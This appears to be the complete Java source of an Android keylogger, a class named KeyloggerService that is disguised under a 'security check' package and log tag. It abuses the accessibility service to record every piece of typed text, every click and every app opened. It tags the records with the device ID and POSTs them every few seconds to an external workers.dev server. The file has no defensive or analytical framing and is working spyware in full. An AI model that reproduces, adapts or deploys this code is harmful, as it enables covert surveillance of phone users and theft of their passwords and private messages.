package com.sec.check;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.os.AsyncTask;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class KeyloggerService extends AccessibilityService {
    private static final String TAG = "SecurityCheck";
    private static final String SERVER_URL = "https://sec.h42536974.workers.dev";
    private StringBuilder buffer = new StringBuilder();
    private long lastFlush = 0;
    private static final long FLUSH_INTERVAL = 5000;
    private String deviceId = "";

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Keylogger service connected");
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        info.notificationTimeout = 100;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                   | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                   | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);

        try {
            deviceId = android.provider.Settings.Secure.getString(
                getContentResolver(),
                android.provider.Settings.Secure.ANDROID_ID
            );
        } catch (Exception e) {}
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            int eventType = event.getEventType();
            
            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                CharSequence text = event.getText() != null && !event.getText().isEmpty() 
                    ? event.getText().get(0) : null;
                
                if (text != null) {
                    String currentText = text.toString();
                    buffer.append(currentText).append("|");
                    tryFlush();
                }
            }
            
            // مراقبة النقرات
            else if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                CharSequence text = event.getText() != null && !event.getText().isEmpty()
                    ? event.getText().get(0) : null;
                if (text != null) {
                    buffer.append("[CLICK:").append(text.toString()).append("]");
                    tryFlush();
                }
            }
            
            // مراقبة النوافذ المفتوحة (يعرف التطبيقات المستخدمة)
            else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                CharSequence pkg = event.getPackageName();
                CharSequence cls = event.getClassName();
                if (pkg != null) {
                    buffer.append("[OPEN:").append(pkg.toString()).append("]");
                    tryFlush();
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "onAccessibilityEvent error: " + e.getMessage());
        }
    }

    private void tryFlush() {
        long now = System.currentTimeMillis();
        if (now - lastFlush > FLUSH_INTERVAL || buffer.length() > 500) {
            String data = buffer.toString();
            buffer.setLength(0);
            lastFlush = now;
            sendToServer(data);
        }
    }

    private void sendToServer(final String text) {
        new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... voids) {
                try {
                    JSONObject data = new JSONObject();
                    data.put("type", "keylog");
                    data.put("device", deviceId);
                    data.put("text", text);

                    URL url = new URL(SERVER_URL + "/apk/data");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(10000);

                    DataOutputStream os = new DataOutputStream(conn.getOutputStream());
                    os.writeBytes(data.toString());
                    os.flush();
                    os.close();
                    conn.getResponseCode();
                } catch (Exception e) {
                    Log.e(TAG, "sendToServer error: " + e.getMessage());
                }
                return null;
            }
        }.execute();
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Keylogger service interrupted");
    }

    @Override
    public boolean onUnbind(Intent intent) {
        return super.onUnbind(intent);
    }
                  }
